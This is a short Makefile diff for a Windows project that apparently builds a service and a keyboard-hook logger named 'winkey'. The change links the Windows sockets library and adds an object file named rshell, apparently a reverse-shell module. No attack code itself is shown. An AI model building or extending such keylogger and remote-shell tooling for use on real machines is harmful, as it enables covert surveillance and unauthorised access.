@@ -7,7 +7,7 @@ CFLAGS      = /nologo /Wall /WX /Zi /DUNICODE /D_UNICODE /Iinclude \
 
 LDFLAGS     = /nologo /DEBUG
 
-LIBS        = advapi32.lib user32.lib kernel32.lib shell32.lib
+LIBS        = advapi32.lib user32.lib kernel32.lib shell32.lib ws2_32.lib
 
 
 SVC_OBJS    = svc\main.obj \
@@ -18,7 +18,8 @@ SVC_OBJS    = svc\main.obj \
 WINKEY_OBJS = winkey\main.obj \
               winkey\hook.obj \
               winkey\foreground.obj \
-              winkey\logger.obj
+              winkey\logger.obj \
+              winkey\rshell.obj
 
 all: svc.exe winkey.exe
 
